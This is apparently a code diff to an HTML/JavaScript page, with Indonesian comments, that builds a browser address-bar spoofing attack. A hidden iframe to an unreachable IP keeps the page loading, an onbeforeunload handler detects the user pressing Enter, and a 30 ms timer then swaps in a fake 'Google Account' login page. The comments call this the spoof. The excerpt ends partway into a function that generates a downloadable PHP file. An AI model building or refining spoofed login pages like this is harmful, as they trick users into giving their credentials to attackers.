@@ -13,20 +13,19 @@
   <script>
     let triggered = false;
 
-    // Iframe untuk simulasi loading lama
+    // iframe NON-ROUTABLE buat nahan loading (BUKAN google)
     const iframe = document.createElement("iframe");
-    iframe.src = "https://10.255.255.1";  // IP yang tidak dapat diakses
+    iframe.src = "https://10.255.255.1"; // sengaja macet
     iframe.style.display = "none";
     document.body.appendChild(iframe);
 
-    // TRIGGER UTAMA (ENTER di omnibox)
+    // ENTER di omnibox
     window.onbeforeunload = function () {
       triggered = true;
     };
 
-    // Delay tambahan buat nahan loading lama
-    setTimeout(() => {
-      // Mulai tampilin konten spoof
+    // tampilkan spoof
+    setInterval(() => {
       if (triggered) {
         document.getElementById("content").innerHTML = `
           <h1>Google Account</h1>
@@ -39,9 +38,9 @@
         `;
         triggered = false;
       }
-    }, 4000); // Tunda selama 4 detik untuk tampilin login
+    }, 30);
 
-    // Fungsi download PHP (dibuat sendiri, tanpa server)
+    // DOWNLOAD PHP (dibuat sendiri, tanpa server)
     function downloadPHP() {
       const php = `<?php
 // wkwkwk file php bebas
